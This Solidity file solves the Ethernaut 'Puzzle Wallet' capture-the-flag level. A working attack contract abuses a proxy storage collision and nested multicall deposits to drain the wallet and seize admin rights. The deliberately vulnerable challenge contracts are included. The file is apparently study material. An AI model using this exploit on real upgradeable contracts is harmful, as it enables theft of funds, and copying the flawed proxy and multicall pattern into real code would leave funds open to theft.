// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
pragma experimental ABIEncoderV2;

import {UpgradeableProxy} from "./UpgradeableProxy.sol";

/**
 * @title 24. PUZZLE WALLET
 * @dev Hijack this wallet to become the admin of the proxy.
 */

interface IPuzzleWallet {
    function admin() external view returns (address);

    function proposeNewAdmin(address _newAdmin) external;

    function addToWhitelist(address addr) external;

    function deposit() external payable;

    function multicall(bytes[] calldata data) external payable;

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable;

    function setMaxBalance(uint256 _maxBalance) external;
}

// We need to override maxBalance with setMaxBalance() in the puzzleWallet contract.
// Because of a storage collision, doing this will override the proxy contract's admin.
// !!! DON'T FORGET TO SEND 0.001 ETH WHEN DEPLIYING THE CONTRACT !!! (or use the forgetToDeposit function...)
contract Ethernaut_PuzzleWallet {
    IPuzzleWallet private puzzleWallet =
        IPuzzleWallet(0xB8759fFB6d451D0a9C9404d1cB0D1B8D75e4F5b0); // Replace with your PuzzleWallet instance

    constructor() payable {}

    function forgetToDeposit() public payable {
        (bool success, ) = address(this).call{value: 0.002 ether}("");
        require(success, "Eth transfer failed");
    }

    function attack() public {
        // 1. Become the puzzleWallet owner, thanks to storage collision
        puzzleWallet.proposeNewAdmin(address(this));

        // 2. Now, we can whitelist ourselves and pass the onlyWhitelisted modifier
        puzzleWallet.addToWhitelist(address(this));

        // 3. Now, the trickky part... We need to set the maxBalance to 0, to avoid the "Max balance reached" error
        // To do that, we need to deposit, but have the contract believes our deposit was bigger than what we send!
        // This can be done by nesting a multicall within a multicall, which will update our balance twice for a single amount sent.
        /*
         * - multicall:
         *     - deposit 0.001 ether
         *     - multicall:
         *         - deposit 0.001 ether
         */

        bytes[] memory deposit_data = new bytes[](1);
        deposit_data[0] = abi.encodeWithSignature("deposit()");

        bytes[] memory data = new bytes[](2);
        data[0] = deposit_data[0];
        // Nested multicall
        data[1] = abi.encodeWithSignature("multicall(bytes[])", deposit_data);
        puzzleWallet.multicall{value: 0.001 ether}(data);

        // 4. Now, we can drain the contract to set the maxBalance to 0, then update its value with our address
        puzzleWallet.execute(msg.sender, 0.002 ether, "");
        puzzleWallet.setMaxBalance(uint256(uint160(msg.sender)));

        require(puzzleWallet.admin() == msg.sender, "Hack failed!");
        // 5. let's get our funds back :)
        selfdestruct(payable(msg.sender));
    }
}

// 🎉 Level completed! 🎉

/*////////////////////////////////////////////////////////////////
                        CHALLENGE CONTRACT
////////////////////////////////////////////////////////////////*/

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(
        address _admin,
        address _implementation,
        bytes memory _initData
    ) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(
            pendingAdmin == _expectedAdmin,
            "Expected new admin by the current admin is not the pending admin"
        );
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}
